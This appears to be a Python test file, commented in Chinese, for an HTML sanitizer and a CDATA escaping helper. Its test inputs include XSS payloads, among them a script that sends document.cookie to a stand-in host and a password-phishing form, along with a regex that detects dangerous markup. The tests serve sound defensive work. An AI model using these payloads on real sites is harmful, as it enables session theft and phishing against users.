"""渲染层：HTML 清洗与 CDATA。

清洗器是这条流水线上唯一挡在「别人写的文本」和「公开页面」之间的东西，
所以这里既测它真的拦得住，也测它没把正常排版拦掉——后者一坏就是全站排版
崩掉，比漏拦更容易被发现，但更容易在调白名单时误伤。
"""
import re, unittest, markdown
from _base import bindir; bindir()
from render import sanitize, cdata

MD = lambda s: markdown.Markdown(extensions=['tables', 'fenced_code', 'attr_list']).convert(s)
DANGEROUS = re.compile(r'<script|<iframe|<svg|<object|<embed|<form|<input|'
                       r'on\w+\s*=|javascript:|data:text/html', re.I)


class TestSanitize(unittest.TestCase):
    def assert_clean(self, markdown_src):
        out = sanitize(MD(markdown_src))
        self.assertIsNone(DANGEROUS.search(out), '未被中和: %r -> %r' % (markdown_src, out))
        return out

    def test_script_tag(self):
        self.assert_clean('描述：<script>fetch("//evil.tld?c="+document.cookie)</script>')

    def test_img_onerror(self):
        # 最常见的一条：仓库描述或 HN 标题里塞一个 img
        self.assert_clean('- 标题：<img src=x onerror="alert(document.domain)"> 发布')

    def test_svg_onload(self):
        self.assert_clean('<svg onload=alert(1)>')

    def test_iframe(self):
        self.assert_clean('<iframe src="//evil.tld"></iframe>')

    def test_javascript_url(self):
        self.assert_clean('[点我](javascript:alert(1))')

    def test_data_url(self):
        self.assert_clean('[点我](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)')

    def test_event_handler_on_allowed_tag(self):
        # p 是白名单里的，但 onclick 不是——属性过滤必须独立于标签过滤
        self.assert_clean('<p onclick="steal()">正常文字</p>')

    def test_form_input(self):
        # 钓鱼表单：不执行脚本也能骗密码
        self.assert_clean('<form action="//evil.tld"><input name=pw type=password>')

    def test_style_injection_dropped(self):
        out = sanitize('<td style="background:url(//evil.tld/x)">x</td>')
        self.assertNotIn('evil.tld', out)

    def test_mixed_case_and_spacing_evasion(self):
        self.assert_clean('<ImG   SrC=x  OnErRoR=alert(1) >')

    # ── 不能误伤的正常排版 ──
    def test_table_alignment_preserved(self):
        out = sanitize(MD('|左|中|右|\n|:--|:-:|--:|\n|1|2|3|\n'))
        # 3 列 × (表头 + 1 个数据行) = 6 处对齐
        self.assertEqual(out.count('text-align'), 6)
        for align in ('left', 'center', 'right'):
            self.assertIn(align, out)
        self.assertIn('<table>', out)

    def test_normal_markup_survives(self):
        out = sanitize(MD('# 标题\n\n**粗** *斜* `码`\n\n- 项\n\n> 引用\n\n[链接](https://example.com)\n'))
        for tag in ('<h1>', '<strong>', '<em>', '<code>', '<li>', '<blockquote>', '<a '):
            self.assertIn(tag, out)

    def test_external_link_gets_noopener(self):
        # 防 window.opener 反向控制；nh3 自动补，这里锁住这个行为
        self.assertIn('noopener', sanitize(MD('[x](https://example.com)')))

    def test_code_fence_content_is_text_not_markup(self):
        out = sanitize(MD('```\n<script>alert(1)</script>\n```\n'))
        self.assertIn('&lt;script&gt;', out)
        self.assertIsNone(DANGEROUS.search(out))


class TestCdata(unittest.TestCase):
    def test_plain(self):
        self.assertEqual(cdata('<p>x</p>'), '<![CDATA[<p>x</p>]]>')

    def test_terminator_is_split(self):
        # 正文里出现 ]]> 会提前结束 CDATA 段，整个 feed 就此损坏
        self.assertNotIn(']]>', cdata('a]]>b')[9:-3].replace(']]]]><![CDATA[>', ''))

    def test_terminator_roundtrips_through_xml(self):
        import xml.etree.ElementTree as ET
        for payload in ('a]]>b', ']]>', 'x]]>]]>y', '<p>a]]>b</p>'):
            xml = '<r>%s</r>' % cdata(payload)
            self.assertEqual(ET.fromstring(xml).text, payload, '往返失败: %r' % payload)


if __name__ == '__main__':
    unittest.main()
